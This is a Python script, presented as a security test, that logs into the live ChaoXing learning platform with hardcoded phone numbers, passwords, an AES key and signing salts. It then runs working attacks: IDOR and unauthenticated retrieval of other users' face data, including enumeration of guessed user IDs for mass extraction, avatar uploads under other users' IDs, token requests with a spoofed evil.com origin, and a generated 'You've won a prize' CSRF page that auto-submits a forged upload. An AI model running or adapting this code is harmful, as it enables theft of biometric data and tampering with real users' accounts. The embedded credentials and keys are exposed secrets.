#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ChaoXing Platform Security Test Script
- Part 1: getUserFaceid API vulnerability (IDOR / unauthenticated access)
- Part 2: Cloud drive token CSRF for avatar upload
- Part 3: IDOR in avatar upload
- Part 4: CSRF PoC for avatar upload
- Part 5: Face verification bypass test
- Part 6: Image URL security test
"""

import base64, hashlib, json, uuid, requests, urllib3, time, io, os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from PIL import Image

urllib3.disable_warnings()

# ==================== Constants ====================
AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
FACEID_SALT = "uWwjeEKsri"
FACEID_TOKEN = "4faa8662c59590c6f43ae9fe5b002b42"

STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
STUDENT_PUID = "431407443"

TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"
TEACHER_PUID = "402644510"

COURSE_ID = "257485372"
CLAZZ_ID = "132821141"

# ==================== Helper Functions ====================
results_summary = []

def record(tag, test_name, status_code, body, extra=""):
    marker = ""
    if tag == "CRITICAL":
        marker = "!!!CRITICAL!!!"
    elif tag == "IMPORTANT":
        marker = "***IMPORTANT***"
    elif tag == "INFO":
        marker = "[INFO]"

    print(f"\n{'='*70}")
    print(f"{marker} {test_name}")
    print(f"{'='*70}")
    print(f"  HTTP Status: {status_code}")
    body_str = body if isinstance(body, str) else json.dumps(body, ensure_ascii=False, indent=2)
    print(f"  Response: {body_str[:2000]}")
    if extra:
        print(f"  Extra: {extra}")

    results_summary.append({
        "marker": marker,
        "test": test_name,
        "status": status_code,
        "success": "true" if status_code and 200 <= status_code < 300 else "false",
        "body_preview": body_str[:300]
    })


def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()


def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()


def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_10941_314 "
            f"(@Kalimdor)_{imei}")


def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "zh_CN"
    })
    resp = s.post(LOGIN_URL, data={
        "fid": "-1",
        "uname": aes_enc(phone),
        "password": aes_enc(pwd),
        "refer": "http%3A%2F%2Fi.mooc.chaoxing.com",
        "t": "true",
        "forbidotherlogin": "0",
        "validate": "",
        "doubleFactorLogin": "0",
        "independentId": "0",
        "independentNameId": "0"
    }, allow_redirects=False, timeout=30)

    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value

    print(f"[*] Login response status: {resp.status_code}")
    print(f"[*] Login response: {resp.text[:500]}")
    print(f"[*] Extracted puid from cookies: {puid}")

    try:
        s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass
    try:
        s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except:
        pass

    return s, puid


def calc_enc(puid):
    """Calculate enc parameter for getUserFaceid API"""
    raw = f"{puid}{FACEID_SALT}"
    return hashlib.md5(raw.encode()).hexdigest()


def create_test_face_image():
    """Create a small test face image in memory"""
    img = Image.new('RGB', (100, 100), color=(255, 200, 150))
    # Draw simple face features
    from PIL import ImageDraw
    draw = ImageDraw.Draw(img)
    # Eyes
    draw.ellipse([30, 30, 40, 40], fill='black')
    draw.ellipse([60, 30, 70, 40], fill='black')
    # Mouth
    draw.arc([30, 50, 70, 80], start=0, end=180, fill='red', width=2)
    buf = io.BytesIO()
    img.save(buf, format='JPEG')
    buf.seek(0)
    return buf


# ==================== Main Test ====================
def main():
    print("=" * 70)
    print("  ChaoXing Platform Security Test")
    print("  Avatar CSRF + getUserFaceid IDOR + Face Verification Bypass")
    print("=" * 70)

    # ---------- Login ----------
    print("\n" + "=" * 70)
    print("[*] Logging in as STUDENT...")
    print("=" * 70)
    stu_session, stu_puid = login(STUDENT_PHONE, STUDENT_PWD)
    if not stu_puid:
        stu_puid = STUDENT_PUID
        print(f"[!] Could not extract puid from cookies, using hardcoded: {stu_puid}")

    print("\n" + "=" * 70)
    print("[*] Logging in as TEACHER...")
    print("=" * 70)
    tea_session, tea_puid = login(TEACHER_PHONE, TEACHER_PWD)
    if not tea_puid:
        tea_puid = TEACHER_PUID
        print(f"[!] Could not extract puid from cookies, using hardcoded: {tea_puid}")

    # ============================================================
    # PART 1: getUserFaceid API Vulnerability Test
    # ============================================================
    print("\n\n" + "#" * 70)
    print("# PART 1: getUserFaceid API Vulnerability Test")
    print("#" * 70)

    # 1.1 Calculate enc values
    stu_enc = calc_enc(STUDENT_PUID)
    tea_enc = calc_enc(TEACHER_PUID)
    print(f"\n[*] Student enc (md5('{STUDENT_PUID}{FACEID_SALT}')): {stu_enc}")
    print(f"[*] Teacher enc (md5('{TEACHER_PUID}{FACEID_SALT}')): {tea_enc}")

    ts = str(int(time.time() * 1000))

    # 1.2 Student enc + student session (baseline)
    url_stu = f"https://passport2-api.chaoxing.com/api/getUserFaceid?enc={stu_enc}&token={FACEID_TOKEN}&_time={ts}"
    try:
        r = stu_session.get(url_stu, timeout=30)
        record("INFO", "Part1.2: Student enc + Student session (baseline)", r.status_code, r.text)
    except Exception as e:
        record("INFO", "Part1.2: Student enc + Student session (baseline)", 0, str(e))

    time.sleep(1)

    # 1.3 Teacher enc + student session (IDOR!)
    ts = str(int(time.time() * 1000))
    url_tea = f"https://passport2-api.chaoxing.com/api/getUserFaceid?enc={tea_enc}&token={FACEID_TOKEN}&_time={ts}"
    try:
        r = stu_session.get(url_tea, timeout=30)
        tag = "CRITICAL" if r.status_code == 200 else "IMPORTANT"
        record(tag, "Part1.3: Teacher enc + Student session (IDOR!)", r.status_code, r.text)
    except Exception as e:
        record("INFO", "Part1.3: Teacher enc + Student session (IDOR!)", 0, str(e))

    time.sleep(1)

    # 1.4 Teacher enc + NO session (unauthenticated!)
    ts = str(int(time.time() * 1000))
    url_tea2 = f"https://passport2-api.chaoxing.com/api/getUserFaceid?enc={tea_enc}&token={FACEID_TOKEN}&_time={ts}"
    try:
        anon_session = requests.Session()
        anon_session.verify = False
        anon_session.headers.update({"User-Agent": get_mobile_ua()})
        r = anon_session.get(url_tea2, timeout=30)
        tag = "CRITICAL" if r.status_code == 200 else "IMPORTANT"
        record(tag, "Part1.4: Teacher enc + NO session (unauthenticated!)", r.status_code, r.text)
    except Exception as e:
        record("INFO", "Part1.4: Teacher enc + NO session (unauthenticated!)", 0, str(e))

    time.sleep(1)

    # 1.5 Teacher enc + teacher session (baseline)
    ts = str(int(time.time() * 1000))
    url_tea3 = f"https://passport2-api.chaoxing.com/api/getUserFaceid?enc={tea_enc}&token={FACEID_TOKEN}&_time={ts}"
    try:
        r = tea_session.get(url_tea3, timeout=30)
        record("INFO", "Part1.5: Teacher enc + Teacher session (baseline)", r.status_code, r.text)
    except Exception as e:
        record("INFO", "Part1.5: Teacher enc + Teacher session (baseline)", 0, str(e))

    time.sleep(1)

    # 1.6 Mass face data extraction - try different puids
    test_puids = ["1", "100", "999999", "1000000", "431407440", "431407441", "431407442"]
    for puid_test in test_puids:
        enc_test = calc_enc(puid_test)
        ts = str(int(time.time() * 1000))
        url_test = f"https://passport2-api.chaoxing.com/api/getUserFaceid?enc={enc_test}&token={FACEID_TOKEN}&_time={ts}"
        try:
            r = stu_session.get(url_test, timeout=30)
            tag = "CRITICAL" if r.status_code == 200 else "INFO"
            record(tag, f"Part1.6: Mass extraction puid={puid_test}", r.status_code, r.text)
        except Exception as e:
            record("INFO", f"Part1.6: Mass extraction puid={puid_test}", 0, str(e))
        time.sleep(0.5)

    # 1.7 Analyze face image URLs
    print("\n[*] Analyzing face image URL patterns from above responses...")
    print("[*] Look for URLs containing face image data in the responses above.")

    # ============================================================
    # PART 2: Cloud Drive Token CSRF for Avatar Upload
    # ============================================================
    print("\n\n" + "#" * 70)
    print("# PART 2: Cloud Drive Token CSRF for Avatar Upload")
    print("#" * 70)

    TOKEN_URL = "https://pan-yz.chaoxing.com/api/token/uservalid"

    # 2.1 Get token normally (baseline)
    try:
        r = stu_session.get(TOKEN_URL, timeout=30)
        record("INFO", "Part2.1: Get token normally (baseline)", r.status_code, r.text)
        # Try to extract _token
        try:
            token_data = r.json()
            stu_token = token_data.get("_token", token_data.get("token", ""))
            if not stu_token and isinstance(token_data, dict):
                for k, v in token_data.items():
                    if "token" in k.lower():
                        stu_token = v
                        break
        except:
            stu_token = ""
        print(f"  Extracted token: {stu_token[:50]}..." if stu_token else "  Could not extract token")
    except Exception as e:
        record("INFO", "Part2.1: Get token normally (baseline)", 0, str(e))
        stu_token = ""

    time.sleep(1)

    # 2.2 Get token without Referer
    try:
        headers_no_referer = dict(stu_session.headers)
        headers_no_referer.pop("Referer", None)
        headers_no_referer.pop("Origin", None)
        r = requests.get(TOKEN_URL, headers=headers_no_referer, cookies=stu_session.cookies.get_dict(),
                         verify=False, timeout=30)
        tag = "IMPORTANT" if r.status_code == 200 else "INFO"
        record(tag, "Part2.2: Get token WITHOUT Referer", r.status_code, r.text)
    except Exception as e:
        record("INFO", "Part2.2: Get token WITHOUT Referer", 0, str(e))

    time.sleep(1)

    # 2.3 Get token with evil Referer
    try:
        headers_evil_referer = dict(stu_session.headers)
        headers_evil_referer["Referer"] = "https://evil.com/"
        r = requests.get(TOKEN_URL, headers=headers_evil_referer, cookies=stu_session.cookies.get_dict(),
                         verify=False, timeout=30)
        tag = "CRITICAL" if r.status_code == 200 else "INFO"
        record(tag, "Part2.3: Get token with Referer: https://evil.com/", r.status_code, r.text)
    except Exception as e:
        record("INFO", "Part2.3: Get token with Referer: https://evil.com/", 0, str(e))

    time.sleep(1)

    # 2.4 Get token with evil Origin
    try:
        headers_evil_origin = dict(stu_session.headers)
        headers_evil_origin["Origin"] = "https://evil.com"
        r = requests.get(TOKEN_URL, headers=headers_evil_origin, cookies=stu_session.cookies.get_dict(),
                         verify=False, timeout=30)
        tag = "CRITICAL" if r.status_code == 200 else "INFO"
        record(tag, "Part2.4: Get token with Origin: https://evil.com", r.status_code, r.text)
    except Exception as e:
        record("INFO", "Part2.4: Get token with Origin: https://evil.com", 0, str(e))

    # ============================================================
    # PART 3: IDOR in Avatar Upload
    # ============================================================
    print("\n\n" + "#" * 70)
    print("# PART 3: IDOR in Avatar Upload")
    print("#" * 70)

    UPLOAD_URL = "https://pan-yz.chaoxing.com/upload"

    # 3.1 Student uploads with own token + own puid (baseline)
    if stu_token:
        try:
            img_buf = create_test_face_image()
            files = {"file": ("face.jpg", img_buf, "image/jpeg")}
            data = {
                "uploadtype": "face",
                "_token": stu_token,
                "puid": STUDENT_PUID
            }
            r = stu_session.post(UPLOAD_URL, data=data, files=files, timeout=30)
            record("INFO", "Part3.1: Student upload own face (baseline)", r.status_code, r.text)
            # Try to extract objectId
            try:
                upload_resp = r.json()
                stu_objectid = upload_resp.get("objectId", upload_resp.get("objectid", ""))
            except:
                stu_objectid = ""
        except Exception as e:
            record("INFO", "Part3.1: Student upload own face (baseline)", 0, str(e))
            stu_objectid = ""

        time.sleep(1)

        # 3.2 Student uploads with own token + teacher puid (IDOR!)
        try:
            img_buf = create_test_face_image()
            files = {"file": ("face.jpg", img_buf, "image/jpeg")}
            data = {
                "uploadtype": "face",
                "_token": stu_token,
                "puid": TEACHER_PUID
            }
            r = stu_session.post(UPLOAD_URL, data=data, files=files, timeout=30)
            tag = "CRITICAL" if r.status_code == 200 else "IMPORTANT"
            record(tag, "Part3.2: Student upload with TEACHER puid (IDOR!)", r.status_code, r.text)
            try:
                upload_resp = r.json()
                tea_objectid_from_stu = upload_resp.get("objectId", upload_resp.get("objectid", ""))
            except:
                tea_objectid_from_stu = ""
        except Exception as e:
            record("INFO", "Part3.2: Student upload with TEACHER puid (IDOR!)", 0, str(e))
            tea_objectid_from_stu = ""

        time.sleep(1)

        # 3.3 Student uploads with own token + another student puid
        try:
            img_buf = create_test_face_image()
            files = {"file": ("face.jpg", img_buf, "image/jpeg")}
            data = {
                "uploadtype": "face",
                "_token": stu_token,
                "puid": "431407444"  # different student
            }
            r = stu_session.post(UPLOAD_URL, data=data, files=files, timeout=30)
            tag = "CRITICAL" if r.status_code == 200 else "IMPORTANT"
            record(tag, "Part3.3: Student upload with another student puid (IDOR!)", r.status_code, r.text)
        except Exception as e:
            record("INFO", "Part3.3: Student upload with another student puid (IDOR!)", 0, str(e))
    else:
        print("[!] No token available, skipping Part 3 upload tests")

    # ============================================================
    # PART 4: CSRF PoC for Avatar Upload
    # ============================================================
    print("\n\n" + "#" * 70)
    print("# PART 4: CSRF PoC for Avatar Upload")
    print("#" * 70)

    csrf_poc = f"""<!DOCTYPE html>
<html>
<head><title>CSRF PoC - Avatar Upload</title></head>
<body>
<h1>You've won a prize! Click below to claim.</h1>
<!-- Auto-submit CSRF form -->
<form id="csrf" method="POST" action="https://pan-yz.chaoxing.com/upload" enctype="multipart/form-data">
    <input type="hidden" name="uploadtype" value="face" />
    <input type="hidden" name="_token" value="{{STOLEN_TOKEN}}" />
    <input type="hidden" name="puid" value="{{VICTIM_PUID}}" />
    <!-- In a real attack, the file could be pre-filled via JavaScript or a crafted filename -->
    <input type="file" name="file" style="display:none" />
</form>
<script>
// Attempt auto-submit (file input requires user interaction in most browsers,
// but the form fields are pre-filled, so a single click on any element submits the attack)
document.getElementById('csrf').submit();
</script>
<!--
Attack scenario:
1. Attacker steals _token via CSRF from Part 2 (no Referer/Origin check)
2. Attacker crafts this HTML page
3. Victim visits this page while logged into ChaoXing
4. Form auto-submits, uploading attacker's chosen image as victim's avatar
5. If uploadtype=face is accepted without server-side puid validation,
   the attacker can overwrite ANY user's face image
-->
</body>
</html>"""

    poc_path = "/workspace/csrf_avatar_poc.html"
    with open(poc_path, "w") as f:
        f.write(csrf_poc)

    print(f"\n[*] CSRF PoC HTML saved to: {poc_path}")
    print("[*] PoC Content:")
    print(csrf_poc)

    # Also generate with actual values if token is available
    if stu_token:
        csrf_poc_filled = f"""<!DOCTYPE html>
<html>
<head><title>CSRF PoC - Avatar Upload (Filled)</title></head>
<body>
<h1>You've won a prize! Click below to claim.</h1>
<form id="csrf" method="POST" action="https://pan-yz.chaoxing.com/upload" enctype="multipart/form-data">
    <input type="hidden" name="uploadtype" value="face" />
    <input type="hidden" name="_token" value="{stu_token}" />
    <input type="hidden" name="puid" value="{TEACHER_PUID}" />
    <input type="file" name="file" style="display:none" />
</form>
<script>
document.getElementById('csrf').submit();
</script>
</body>
</html>"""
        poc_filled_path = "/workspace/csrf_avatar_poc_filled.html"
        with open(poc_filled_path, "w") as f:
            f.write(csrf_poc_filled)
        print(f"\n[*] CSRF PoC (filled with actual token) saved to: {poc_filled_path}")

    # ============================================================
    # PART 5: Face Verification Bypass Test
    # ============================================================
    print("\n\n" + "#" * 70)
    print("# PART 5: Face Verification Bypass Test")
    print("#" * 70)

    # First, try to get a face objectId from getUserFaceid
    test_objectid = ""
    ts = str(int(time.time() * 1000))
    url_stu_face = f"https://passport2-api.chaoxing.com/api/getUserFaceid?enc={stu_enc}&token={FACEID_TOKEN}&_time={ts}"
    try:
        r = stu_session.get(url_stu_face, timeout=30)
        if r.status_code == 200:
            try:
                face_data = r.json()
                # Try to extract objectId from response
                if isinstance(face_data, dict):
                    for key in ["objectId", "objectid", "faceId", "faceid", "id"]:
                        if key in face_data:
                            test_objectid = str(face_data[key])
                            break
                    # Check nested data
                    if not test_objectid and "data" in face_data:
                        data_inner = face_data["data"]
                        if isinstance(data_inner, dict):
                            for key in ["objectId", "objectid", "faceId", "faceid", "id"]:
                                if key in data_inner:
                                    test_objectid = str(data_inner[key])
                                    break
                        elif isinstance(data_inner, list) and len(data_inner) > 0:
                            for key in ["objectId", "objectid", "faceId", "faceid", "id"]:
                                if key in data_inner[0]:
                                    test_objectid = str(data_inner[0][key])
                                    break
            except:
                pass
    except:
        pass

    # If we got an objectId from upload, use that
    if not test_objectid and stu_objectid:
        test_objectid = stu_objectid

    # Use a sample objectId if we still don't have one
    if not test_objectid:
        test_objectid = "test_object_id_placeholder"
        print(f"[!] Could not extract objectId from API, using placeholder: {test_objectid}")
    else:
        print(f"[*] Using objectId for face verification tests: {test_objectid}")

    # 5.1 clientfacecheckstatus
    url_check = f"https://mooc1-api.chaoxing.com/mooc-ans/facephoto/clientfacecheckstatus?courseId={COURSE_ID}&clazzId={CLAZZ_ID}&objectId={test_objectid}"
    try:
        r = stu_session.get(url_check, timeout=30)
        record("INFO", "Part5.1: clientfacecheckstatus with own objectId", r.status_code, r.text)
    except Exception as e:
        record("INFO", "Part5.1: clientfacecheckstatus with own objectId", 0, str(e))

    time.sleep(1)

    # 5.2 updateqrstatus
    url_qr = f"https://mooc1-api.chaoxing.com/qr/updateqrstatus?clazzId={CLAZZ_ID}&courseId={COURSE_ID}&objectId={test_objectid}"
    try:
        r = stu_session.get(url_qr, timeout=30)
        tag = "IMPORTANT" if r.status_code == 200 else "INFO"
        record(tag, "Part5.2: updateqrstatus with own objectId", r.status_code, r.text)
    except Exception as e:
        record("INFO", "Part5.2: updateqrstatus with own objectId", 0, str(e))

    time.sleep(1)

    # 5.3 uploadInfo POST
    try:
        r = stu_session.post("https://mooc1-api.chaoxing.com/mooc-ans/knowledge/uploadInfo",
                             data={"objectId": test_objectid, "courseId": COURSE_ID, "clazzId": CLAZZ_ID},
                             timeout=30)
        record("INFO", "Part5.3: uploadInfo POST with own objectId", r.status_code, r.text)
    except Exception as e:
        record("INFO", "Part5.3: uploadInfo POST with own objectId", 0, str(e))

    time.sleep(1)

    # 5.4 IDOR - use teacher's objectId (if we got one from the IDOR upload)
    if tea_objectid_from_stu:
        url_check_idor = f"https://mooc1-api.chaoxing.com/mooc-ans/facephoto/clientfacecheckstatus?courseId={COURSE_ID}&clazzId={CLAZZ_ID}&objectId={tea_objectid_from_stu}"
        try:
            r = stu_session.get(url_check_idor, timeout=30)
            tag = "CRITICAL" if r.status_code == 200 else "INFO"
            record(tag, "Part5.4: clientfacecheckstatus with teacher's objectId (IDOR!)", r.status_code, r.text)
        except Exception as e:
            record("INFO", "Part5.4: clientfacecheckstatus with teacher's objectId (IDOR!)", 0, str(e))
    else:
        print("[!] No teacher objectId from IDOR upload, skipping Part 5.4")

    # ============================================================
    # PART 6: Image URL Security Test
    # ============================================================
    print("\n\n" + "#" * 70)
    print("# PART 6: Image URL Security Test")
    print("#" * 70)

    # Collect URLs from faceid responses
    face_urls = []
    ts = str(int(time.time() * 1000))
    url_stu_face2 = f"https://passport2-api.chaoxing.com/api/getUserFaceid?enc={stu_enc}&token={FACEID_TOKEN}&_time={ts}"
    try:
        r = stu_session.get(url_stu_face2, timeout=30)
        if r.status_code == 200:
            try:
                data = r.json()
                # Recursively search for URLs
                def find_urls(obj, depth=0):
                    if depth > 5:
                        return
                    if isinstance(obj, str):
                        if obj.startswith("http") and ("chaoxing" in obj or "mooc" in obj or "pan" in obj):
                            face_urls.append(obj)
                    elif isinstance(obj, dict):
                        for v in obj.values():
                            find_urls(v, depth+1)
                    elif isinstance(obj, list):
                        for item in obj:
                            find_urls(item, depth+1)
                find_urls(data)
            except:
                pass
    except:
        pass

    if face_urls:
        print(f"[*] Found {len(face_urls)} face image URLs from API responses")
        for i, url in enumerate(face_urls):
            print(f"  URL[{i}]: {url}")
    else:
        print("[*] No face image URLs found in API responses")
        # Try common URL patterns
        face_urls = [
            f"https://mooc1-api.chaoxing.com/mooc-ans/facephoto/getfaceimage?objectId={test_objectid}",
            f"https://pan-yz.chaoxing.com/download/{test_objectid}",
        ]

    # 6.1 Access URLs without cookies
    for i, url in enumerate(face_urls):
        try:
            anon_sess = requests.Session()
            anon_sess.verify = False
            r = anon_sess.get(url, timeout=30, allow_redirects=True)
            tag = "CRITICAL" if r.status_code == 200 else "INFO"
            content_type = r.headers.get("Content-Type", "unknown")
            record(tag, f"Part6.1: Unauthenticated access to image URL[{i}]", r.status_code,
                   f"Content-Type: {content_type}, Size: {len(r.content)} bytes, URL: {url}")
        except Exception as e:
            record("INFO", f"Part6.1: Unauthenticated access to image URL[{i}]", 0, str(e))
        time.sleep(0.5)

    # 6.2 CORS check
    for i, url in enumerate(face_urls[:3]):  # Only check first 3
        try:
            anon_sess = requests.Session()
            anon_sess.verify = False
            r = anon_sess.get(url, timeout=30, headers={"Origin": "https://evil.com"})
            cors_header = r.headers.get("Access-Control-Allow-Origin", "NOT SET")
            acac = r.headers.get("Access-Control-Allow-Credentials", "NOT SET")
            tag = "CRITICAL" if cors_header == "*" or cors_header == "https://evil.com" else "INFO"
            record(tag, f"Part6.2: CORS check on image URL[{i}]",
                   r.status_code, f"CORS: {cors_header}, Credentials: {acac}")
        except Exception as e:
            record("INFO", f"Part6.2: CORS check on image URL[{i}]", 0, str(e))
        time.sleep(0.5)

    # 6.3 Directory listing check
    for url in face_urls[:2]:
        try:
            base_url = url.rsplit("/", 1)[0] + "/"
            anon_sess = requests.Session()
            anon_sess.verify = False
            r = anon_sess.get(base_url, timeout=30)
            has_listing = "Index of" in r.text or "Directory listing" in r.text or "<title>Index" in r.text
            tag = "IMPORTANT" if has_listing else "INFO"
            record(tag, f"Part6.3: Directory listing check on {base_url}",
                   r.status_code, f"Has listing: {has_listing}, Preview: {r.text[:200]}")
        except Exception as e:
            record("INFO", f"Part6.3: Directory listing check", 0, str(e))

    # 6.4 URL predictability analysis
    print("\n[*] URL Predictability Analysis:")
    for i, url in enumerate(face_urls):
        # Extract path components
        path = url.split("?")[0]  # Remove query string
        parts = path.split("/")
        print(f"  URL[{i}] structure: {'/'.join(parts[:6])}/.../{parts[-1] if parts else 'N/A'}")
        # Check if any part looks like a sequential ID or hash
        for part in parts:
            if part.isdigit():
                print(f"    -> Numeric segment found: {part} (potential sequential ID)")
            elif len(part) >= 16 and all(c in '0123456789abcdef' for c in part.lower()):
                print(f"    -> Hash-like segment found: {part[:20]}...")

    # ============================================================
    # SUMMARY
    # ============================================================
    print("\n\n" + "=" * 70)
    print("  VULNERABILITY SUMMARY TABLE")
    print("=" * 70)
    print(f"{'Marker':<20} {'Test':<60} {'Status':<8} {'Success'}")
    print("-" * 100)
    for item in results_summary:
        print(f"{item['marker']:<20} {item['test']:<60} {str(item['status']):<8} {item['success']}")

    # Count critical/important findings
    critical_count = sum(1 for i in results_summary if i['marker'] == "!!!CRITICAL!!!")
    important_count = sum(1 for i in results_summary if i['marker'] == "***IMPORTANT***")
    info_count = sum(1 for i in results_summary if i['marker'] == "[INFO]")

    print(f"\n\n{'='*70}")
    print(f"  FINAL COUNT")
    print(f"{'='*70}")
    print(f"  !!!CRITICAL!!! findings: {critical_count}")
    print(f"  ***IMPORTANT*** findings: {important_count}")
    print(f"  [INFO] findings: {info_count}")
    print(f"  Total tests: {len(results_summary)}")
    print(f"{'='*70}")


if __name__ == "__main__":
    main()
